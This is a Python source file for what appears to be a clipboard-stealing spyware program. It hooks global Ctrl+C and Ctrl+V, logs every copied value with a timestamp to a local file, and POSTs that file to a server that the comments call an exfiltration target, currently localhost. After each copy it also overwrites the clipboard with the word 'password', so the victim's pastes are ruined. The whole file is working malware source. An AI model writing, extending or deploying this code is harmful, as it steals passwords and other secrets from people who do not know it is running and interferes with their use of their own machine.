import pyperclip
import requests
import schedule
import time
from pynput import keyboard
import keyboard

def main():

    #gets the clipboard information and puts it in a file every 90 seconds.
    schedule.every(90).seconds.do(get_clipboard_info)

    #Adds a hotkey, can't have parenthesis becasue it returns as a none type instead of a boolean
    #explore the timeout feature to add some more functionality
    # TODO: right click copy as well, and paste
    keyboard.add_hotkey('ctrl+c', get_clipboard_info)

    #ctrl V ensures that the clipboard data is changed to password
    keyboard.add_hotkey('ctrl+v', change_password)

    #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
    #code handles the scheduled task
    while True:
        schedule.run_pending()
        time.sleep(1)

#global value that stores the last clipboardValue copied, starts as empty
last_clip_board_value = ''

"""
get_clipboard_info is triggered when Ctrl+C happens. The method checks if the clipboard data 
is different from the last clipboard data that was copied. If it is, then it adds it to the local 
clipboard data file, adds a timestamp to the password, and sends a post request to the server with 
the clipboard file atatched. 
"""
def get_clipboard_info():
    #have to define as a global because of how python scope works
    global last_clip_board_value

    #need a delay here so that the ctrl+c copy updates the clipboard before the information is grabbed
    #if we do not have this delay: at the end of this method the clipboard info is changed to password
    #so if there is no delay then the password sometimes remains as the clipboard info
    #it would then be saved as the clipboard info before copy updates. this delay makes sure that
    #the clipboard is updated with the copied info before it is assigned to any variables
    #short delay so that when ctrl+v is used it still copies password over and then pastes it
    time.sleep(0.25)

    # paste, pastes text from clipboard
    clipboard_info = pyperclip.paste()

    # a appends data to file so the passwords can be stored over time password
    clipboard_data_file = open("myfile.txt", "a")

    #checks if the last clipboard value is equal to the current one
    if not last_clip_board_value == clipboard_info:
        #writes the clipboard value to the file along with a timestamp
        clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
        clipboard_data_file.write("\n")

        #closes the file to avoid issues with already being at the end of the file when trying to exfil the contents
        #of the file
        clipboard_data_file.close()

        #reopens the file in read only mode
        exfil_file = open("myfile.txt", "r")

        #Posts the file to the server (currently local host), and assigns the file under the key: file
        requests.post("http://127.0.0.1:12345/output", files={'file': exfil_file})

    #if the last and current clipboard value match then close the file
    else:
        clipboard_data_file.close()

    #Updates the last clipboard value
    last_clip_board_value = clipboard_info

    #changes the clipboard data to password
    change_password()

"""
add_invisible_character_to_clipboard takes the current clipboard_value and adds an invisible character 
to the end of it
"""
def add_invisible_character_to_clipboard() -> None:
    # https://unicode-explorer.com/c/115F
    invisible_character = 'ᅟ'

    # paste, pastes text from clipboard
    clipboard_info = pyperclip.paste()

    # copy - copies whatever text to the clipboard
    #in this case copies the current clipboard info plus an invisible character
    pyperclip.copy(clipboard_info + invisible_character)

"""
change_password changes the clipboard data to password
"""
def change_password() -> None:
    # copy - copies whatever test to the clipboard
    #in this case copies the current clipboard info plus an invisible character
    pyperclip.copy('password')

#calls main
main()